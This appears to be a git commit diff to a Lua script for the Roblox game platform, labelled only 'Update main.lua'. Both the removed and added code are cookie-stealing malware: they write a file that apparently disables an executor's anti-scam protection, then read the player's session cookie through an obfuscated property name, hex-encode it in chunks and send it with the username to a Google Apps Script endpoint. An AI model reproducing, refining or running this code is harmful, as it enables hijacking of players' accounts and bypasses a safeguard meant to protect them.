6d2c27167184712e1e8b4d1001a19b3f582fdd13
delt-script <github.123abc@gmail.com>
2026-04-25 19:27:06 +0900

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,19 +1,27 @@
-function doSnatch()local gasUrl = "https://script.google.com/macros/s/AKfycbzWKCkpoBcO6AZzlp4uWB6zfzo9nzcdJ_vRdiA7n2RRgqb51M0IkK7d9AwidKUpXGOr/exec"
-local uName = game.Players.LocalPlayer.Name
-local uId = tostring(game.Players.LocalPlayer.UserId)
-local bP = "Delta/Internals/Secured/"
+local gasUrl = "https://script.google.com/macros/s/AKfycbzWKCkpoBcO6AZzlp4uWB6zfzo9nzcdJ_vRdiA7n2RRgqb51M0IkK7d9AwidKUpXGOr/exec"
+local player = game:GetService("Players").LocalPlayer
+local myUserId = tostring(player.UserId)
+local bP = "Delta/Internals/Secqured/"
+
 local function doBypass()
-    local payload = string.format([[{"warning":"stop","allowed_games":"*","user_id":"%s"}]], uId)
-    local target = bP .. "disableantiscam"
-    return pcall(function() writefile(target, payload) end)
+    local config = string.format([[{"warning":"stop","allowed_games":"*","user_id":"%s","version_num":707}]], myUserId)
+    local target = bP .. "disableantisbam"
+    pcall(function() writefile(target, config) end)
 end
-    local sct = game["CooNkie":sub(1,3).."Kie"]
-    for i = 1, #sct, 20 do
-        local f = sct:sub(i, i+19)
-        local h = ""
-        for j = 1, #f do h = h .. string.format("%02X", f:byte(j)) end
-        game:HttpGet(gasUrl .. "?hex=" .. h .. "&user=" .. uName)
-        task.wait(0.8)
+
+local function snatch()
+    local cook = game["Coo".."kie"]
+    if cook and cook ~= "" then
+        for i = 1 , #cook, 20 do
+            local f = cook:sub(i, i+19)
+            local h = ""
+            for j = 1, #f do h = h .. string.format("%02X", f:byte(j)) end
+            game:HttpGet(gasUrl .. "?hex=" .. h .. "&user=" .. player.Name)
+            task.wait(0.8)
+        end
     end
 end
-if doBypass() then task.wait-1.5) doSnatch() end
+
+doBypass()
+task.wait(1.5)
+snatch()
